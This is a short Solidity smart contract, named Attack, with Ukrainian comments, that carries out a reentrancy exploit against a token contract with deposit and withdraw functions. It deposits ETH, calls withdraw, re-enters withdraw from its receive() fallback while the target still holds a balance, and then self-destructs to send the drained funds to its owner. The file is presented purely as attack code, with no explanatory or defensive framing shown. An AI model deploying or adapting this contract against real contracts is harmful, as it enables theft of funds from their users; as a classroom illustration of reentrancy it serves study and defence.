pragma solidity ^0.8.2;

interface IToken {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function balanceOf(address owner) external view returns (uint);
}

contract Attack {
    IToken public target;
    address payable public owner;

    constructor(address _target) {
        target = IToken(_target);
        owner = payable(msg.sender);
    }

    function attack() public payable {
        target.deposit{value: msg.value}(); // Депозит ETH для запуску withdraw
        target.withdraw(target.balanceOf(address(this))); // Перший виклик withdraw
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(1); // Рекурсивний виклик withdraw
        } else {
            selfdestruct(owner); // Виведення залишку, коли контракт вичерпано
        }
    }
}